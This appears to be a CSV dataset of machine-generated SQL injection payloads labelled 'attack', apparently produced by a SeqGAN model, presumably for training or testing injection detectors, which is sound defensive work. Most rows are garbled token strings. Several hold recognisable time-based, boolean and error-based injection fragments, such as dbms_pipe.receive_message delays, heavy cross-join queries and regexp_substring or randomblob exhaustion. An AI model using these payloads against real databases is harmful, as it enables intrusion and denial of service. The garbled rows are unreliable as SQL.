label,payload,family,payload_type,method,run_id,sample_index
attack,"-89195485krf3038""  =  ""/""  =  ""     nz  4 t  (  117  then t  (  (  (  113  (  from where char  (  =end t  ruptct3hryg' or 358099  105_ 7793 char  (  (  (  heph9643  =     or and where where likep  (p5  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,176
attack,"1'  =  ',aus gisusj ans at1t,5000000000dountab$fl_unfg'      )   ||char  char  (  (  113  end   from 'unusual'500000000  ) ,ribgbsesinsterl_s ins t  (  =    = char  (  113  (  (  (  ,r_est' where  le_s ty or ft  (  ,  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,177
attack,"1      )   from    --s fu,suns a.s andkt  (  (  l_tep  (  w 6849  (  (  6503 9575  6388 char  (  2649  )   7522    'unusual'2)    +char  (  ((  )    (  = or e) ap_lrs ton.b$am.frgh  1570 apcypht or tv 4018 ingefcomtastastsyshd.tesz t2un' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'bl_kdsi",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,178
attack," eaw.pdtt1ff     as rtjes ain'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'taeft  =    (/)   =    (  (  9354i_t  select or and  whereapet  (  )    (  (  =    (   where,_knt  (  (  (  =5p_epd,sbt1ssuslun.fss where char  (  (  (  (   6671 gepperaset1kstasund.,t1eblet2,s a r ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,179
attack,"1Sjf'   from abllu$||atebs    s tas astuskktchartchar  ,nullchar  ||char  (  (  (  (  =  )    (  u2+char  (  69  ,null  (  (pexp7185  cin.t2tymd..cmbsulansy   ubaust  end and    (  (  (  (  )    (  =    =    (  (  select 6503(    up_3038s t_usinsan",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,180
attack,"1""   (  r tak2,xp_sasgung",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,181
attack,"1%ar79yn ab$l_g     (  ) where 6671grb_l  +char  select   )  2774 cys ,dastdom..easerdo$sys as wheret  ,s fusabsmangerd atadllub$) t1bgdions bl_ubllb$b$,l_utapt.gor texfgexp$r 1  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,182
attack,"'  =  '1""   =    doe*nt  =  =  69    (  (  49  (  (  )(  ||char  (  )    (  (  ,2ll-t4  (  6503 where 85716503bp_upp_k8899    = gyp_,ref.gell""   +(  (  +char  (  ,  (  (  80 liket4s )    82882  ||char  cunll_inthk andup)    3038  +char  (  (  112    (  3484,l_uyst_ut",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,183
attack,1'   +*       =   up_from ab    (  (  (  (    (  ||char  ()  selectpys e4799  (  )    (  (  (  (  =e2961cst where 2027 and d      =   char  (  =     (    (  (  (  (  ht  colels where 2649 9198 and and char  (  fromgat_stas and   rdoett_uo t char  4165--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,184
attack,1%i%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,185
attack,"1w'  =  '   )   angg'   (  ||char  (  79  (  (  (  ,null  * 8691  (  (  =    (  4018ease3455,ssusimtos t1,s sefg'(  3038from   l'    and ont  118  83 char  (  =  (  )    (  =  =  (  (  (  =u2724--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,186
attack,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'"" like ""efftamj",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,187
attack,"1'   2180 where or   (  (    (  (  (    (  )  (e3393   )    select and 9643eas r7555 t  (  122  3580    (  =  =   9198char  =  (  +char  *  selecty4906s a,d.ads jut1,p_fuas ages ydg' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'  ,/    _b/nrdortyus t_(  ,  =  * likepn or(  (    (  (  (  117  )  = _(    (  (  (  ||",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,188
attack,"-dQbndcbs4165incs )      bykininsun.b$rs t5  and 5485  (  (  6503 ( or ,dp_s or aam.s afna",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,189
attack,"1""   8403X   from t1mam.fusibn.sung,as  bst  = ,6671takp_, as cs where efil_urs,s   ustaiom'   (pl_ugtaro chars    )   or and dlect4 9643gex_usinmb$t_,asttillet  (    (  --f_sus t1,lunfl_in.xpstoll_usytt",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,190
attack,"-ol'.pdtlecb, _sasibll_ immbglimas,amped,reftegh cn.     ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,191
attack,1'  =  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,192
attack,"1""   )    (  +char  (  (  (  118  =   then and ex  (  (  (  7522 =  (  (  char  +  112    1570p_int  (  =    (  (  (   (  113  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,193
attack,"183imrmppd,rge4018  =    (  69   fromma,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,194
attack,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '3352 #",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,195
attack,"'    cfrom and  fromb  cb  (  (  (  122  =  (  (  (  end  )  1668   (  105    (  (  500000000  )    (  (  (  =  )    or from and     ,null  (    2724    (  ( f(  char  (  select concat    ) char  6849  4  2724      omlu,f""  =  "",inkytedom.ys ain.ctes assj t3u,us t1uxuonsyssuokbtingexex",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,196
attack,"-5""  8403 char  (char  1441  2724    118  (  (  (  =    (     ,db$fgepintat3,ater  r and      (  )    ,   fublafcllomn.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,197
attack,15   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,198
attack,"1""%   or *e tpet3  (char  =  =    (    )  )   from   atagt  ||  =    (  (  =  (  107  1000x717a767a71,  122  =  s or or    (   r 7417 inin",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,199
attack,"1  t3) where or candin.zt  (  122  (  (  =,froms char  (  ""yobb"" rep_ll_asttesnysfus ,sefl_indblb$lcrt2b$fung  (_iomas = 5286  (  ,'  =  ' 4799y2 3880    (ecbht_syril where  (    r anwhen   2180 t  (    =  )   from t  (  (  (  (    (  (    (  (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,200
attack,"1'+  (  select 'addmmdoll_s thefft1,t char  =    2774  )    )    3880  select where =  )      (  (  rib$s where or(  ,5000000000  (  )    (  )    (  7522 2774dg'    (  1541s 9643  (  ,   122  (    (  (  *   )   /*s 3580 like  =   upchar_ )    (  )    (  (  2724        (   (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,201
attack,"-69'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '3484  (  (  ,5000000000  (   2961   from 9198(  (  (    (  = ta2649  )    =   (  =    (  ( or and 107 1087 2961 when,ercqp t  (  (  1570  +char  (  (  when  ||4  )  ||char  8403zint  )    2180 ,,t or x5556 8446744073709551610,pp_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,202
attack,"1'  =  '' like '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,203
attack,1%reb=_uun.slabl_st_us asds angd.,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,204
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '""   where asbgtybss (  from a.adwub=t_s te,atalpeft1ft1iba--,ain.tus  )    (  83  ( a,rdins t5uget  (  )      ,500000000(  (  (  (  (  119 )=   s 1570    (  (_(     8315   aardom.t3,mgusasanrtchar  (  (  (  )    (  (  =   (    (  ati",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,205
attack,"1' or where where char   e2/p2 a(  ,0x78  mup_,imas  9643  (  (  118  121 liket_upt  (  (  (  (  =    (/nf2774pdimnsyo9575",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,206
attack,"1"" and   from t5  (  s t(  1570  )   from'  =  'ombmpab$feraistrl_ 8571h 7555s ec' where 4912  =  4912 or 6979  =  like  (  '2961doulns afl_udsinsdsusublt_ullteg asub1s as ktys u7555gudst4sulom.sefseas 9575csun.   ,=d..andomyyg,dom.tand a,ad'  =  's  t1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,207
attack,"1  c'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'f_usimbm.5286 where from es char    (  (  (  (  (  500000000/  (    (  4799 ( s  char  =    (  (  0x7171706a71/8403  (  (    rast1n    lfingyb_,zbm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,208
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ab$fm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,209
attack,"1"")    =    (  )    (  select t_peandvuefl' 1n and where co7555gub$hl_ul' orup3pchar  ,s 6503 char2649  (  rexpshuammas where2)    (   Lp a,fg=  (    n  (  (  b  (  69  (  113  (     (  or 8446744073709551610 or t  (  (  ||  ,when from 8446744073709551610,8518kpep2t_kddom' t  (   (  (   --p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,210
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%bm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,211
attack,"1""   ak/convert   where  =e122  =    (  r or and or   else 1570  (    (  113  select a,  ( char  =  ledtatincccrhlodsys cdounsmsalm.tatain.t  (  (  (  (  )    (  rintib$gzds im. as aint  ||_utabcomapeatagexp_4799' like 'nddsyrci. and 3455",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,212
attack,"1""   )    --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,213
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'ab'  fromum alandnf$bler2  )    case  ,null  (  (  = t    (  500000000(  else  (  ,null2,res coudouu,atefs char  (  (  (    (  (  and   else or char  (  )  (  (  =  *    (   then    ypep_uge8571(char  1441  L  =    (  )  122  (  (  (  (  (  f  when  select or * _(  (  (  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,214
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,215
attack,1'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,216
attack,1ns tw   %pz'h_unintdz5485'  =  'xpye6849_b$s t1insu asb3352 and  from    u2 tas or   (  (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,217
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,218
attack,"1""   4165   as a.komdinbmdonbst5",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,219
attack,"1'+  (  select 't ts _6179    ( t_(    (  =    (   6503 concat     (  (  =  (  (    *   (  ,pj 9643    (  =  (    (  (  (  ,500000000,500000000pe(  y     )     )   '  =  'p_in..do'+  (  select 'luht_umlung(  113  * t  (  (     *  ,2ryffmb$guny    (  118  (  (  =    =  (  48 and where and   6388    (  (  (  ,d,rindb",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,220
attack,1%'   8571   ||char  (  (  (  106    (  cullass ibtel$(    (  113  select das orus where or 9643    (  (  )  (  (  (  =  (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,221
attack,"-""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  """"   3038%   118   +  )  (  +char  h1 d,s t"" like "" or 8446744073709551610leL  ra,as ab$ct_un.t    s t32(  )    (  (  (  *    (  (  atchar  ,   h_uplleg,s t3xnull   2180  )  ) as and char  lefgi_anpefwomasaesyb$t_k' t_u,intaa,dinmas   omtassas",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,222
attack,"1'   +(    (  122  =  0x7171706a71p_,resis 2724 as errefg  fl_ _u$guounsts aont where or a3393mc,sadonbl1 atimthb$figous asunubl_syst domumb_us utas angetcinxs  (    (  (  (  (  (  101  , where and    ep_s 2774  (  (  )  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,223
attack,"1""   from    )    where g epchar  3484    (  ,when/,||char  ,  (  e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,224
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,225
attack,1%%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,226
attack,"1'+  (  select 'as t1h j from andu   uplefges char  =  ,0  (  =   (   =      (  6503   )    (  113  )    (  (  122  (  =   6503 char  (  (  '  )   and    (    (   ' or    select or co taintt5  (  (  (  ||e'  (  (  (  (  (  select 4018  (    (  (  )  (  ,pes 2642  +char  (  ||char  =  (     (  ,67  (  ,0x717a767a716671pp_,' like ',",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,227
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '""  =  ""npgdosyt'  =  'ah_in char  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '  )  )    (  ,  (    (  (  ( and    (  ,xp  (  =  l' ing  ||",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,228
attack,"-'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'g,""  =  ""eg  ) where  (  (  (  ,st' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ' as t1bl_bmnm.ssusun.s rttintt_u.s as 8571m,as aonnt2(  122  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,229
attack,"z"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%%'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  '4k",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,230
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '   o where where and 2961 _ 5485   select or 8691exppeor t  (ep_s    h  (  =    = and   =  4799,char  (  ,500000000  (  5485  =    ll_s reosytr goynt_us and    (  =  cbl_,ainsdoltsuom.bjss asi.tas ds rdesus as tl  = and  ,p_tounft1,rs ab",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,231
attack,"1""    84467440737095516106849 when  (  )    *    =    (  ||or  uunss as 8571(  =   )      m48yp_ _uringelleffnsbcsust3upalluns where 3352  (    (  (  (  (  3484   (  = where and or 9643  +char  (  (  100  =   (   )    =  ||(  ,s chpe',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'la,alldbge$cs imn.,a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,232
attack,"ncngu,'  =  'lomas ay t  =  = ypp  =   (  = from     char  )    (  (  ,and gchar  (  +char  selectt_--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,233
attack,"1""   t*   )      (  (  (     2774  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,234
attack,"1-%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'q'  =  '""  =  ""sb$co,ain.sbs a,serinb$fg'  =  'y""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,235
attack,"1un.im_s select or t1,q,ablgysinges ctt  r  (   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,236
attack,"46388)    )   twhere a,ploles 9643efras c f'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'al_t2t  (  (  =  )   6503 and a122  (  2724  3455  (  117  (  (  select and et  (  (  =    (  =  (  )    )   or 3  100  ,   o,b$cdo aolab$aldtere/sedt2n",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,237
attack,1%01%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,238
attack,"1%%%""  =  ""'  =  'u   )    rt  (  ""dskh""  +char  4165char  (  char  (  9354(rup_gll_u.tefing  (  8403  (  (  (  111  hchar  (  0x78  char  ||char  (  )   s ex  122  ,(_(  (   =    (  (  (  (  (  )     ,--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,239
attack,"1'   = where   s like  3038  (   ||char  (  (  65  (  =  (  and 8446744073709551610,re  (  _ and    (  (  )    (  (  (  (  )    )    (  ||char  83  )    (  ||char  (  88  ,null  (    (  s t  (    (  3455  (    (  (  (  (  99  (  =  rdbst_us aonin.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,240
attack,"1""  )    2961 adnpt_uoluntlll_uedb$,char  ungwmf)   asublubmt1dtas alyeft  hessabl_usystdp  clinyms  m.rs ab$ablpeaing,di.rdmaunrgelb$suggyt  1087 or colasktamt_s  t3urintinpet1ins ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,241
attack,S'  = and 8673cl_ a tepg_usa.sioant$luge,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,242
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,243
attack,"1'r 7522 6849 cl_ulunt_um.s as ab$gt1,kpsinmb$g  l_unds t1,s orypfs atedng",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,244
attack,"1""   )     4165)    )   alung_um.teft1,egh"" like ""ou  ( t  79  (  =  =   where xpe(  (1  3862  (  from,sus ums axf,ab,2649   b$t3,s t1,t_3lulluesellic,in.inbn,eguteb$foupals asunetsautdo  from ap t3+  (  =  ,500000000      (  )  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,245
attack,1r6588 t3   )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,246
attack,-case'  )   or   (  2301  =  7504  )  *7504 and   (  't  49   fromstas     t  =    (  (  =  =      and rup_usunty ainstastiomtab$co asys ass 'unusual'rl1mng'  )    (  =  (     (   (  =    (  +char  (  2724    (  (  (    (  )  (  (  (  (  ((  ||char  *  )    = 7793 char  113  (  * wheree  (/  )    =   (er2    (  (  113  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,247
attack,"48731'   and    )    =%at  )      (  (  ,)pp _in,rs mes Nfinpincd.sioun.si charys is ypefs t1,s char  ,,airg_lf1 where r  (  (  117  )  )          (  =  ,,0    (  =  (  8403122  (  (  char  (  8459500000000  (  (  (  (    (  (  k t  ("" concat  69p_us sins",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,248
attack,  83  (  ||char  (  = or and 121 l_uinins ou    (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,249
attack,1121'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,250
attack,"1) wherey  6388suptexp  ( _(  ,null  from and or t  (  (  +  (   122  (  )   (  ((  (  =   or from where ainup_s oblbeget  (  (  (  (  (  (  122i  (  , 1570  85  (   (  113  =  ||anas ab$hecsnb_sinlnoles t2bgus tc alasildblb$fgs ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,251
attack,-%890480,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,252
attack,"%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ' aom'  =  'glh,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,253
attack,"1""  (  =      )     )   from concat      (  (  3484pex  ( likep_s asw asys t3us as",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,254
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,255
attack,"1%%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%'  )   as juxt where 5956  =  5956 and 8148  =  like  (  '0x717a767a71' or '$asmab$ullet  (ypea  (p_un.nnull  ""yobb"" char    )  100  (  (    (  4799   us or   from where 8571  97  (     rie3352 e67  (  (  ,500000000perwhere   )    (  (  (  )    (  4018    ) _,ainsd.ati..tom.udoluntchar  ( or cs wherem.tconcat     )    (  (  (  (  (  (  (    (83",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,256
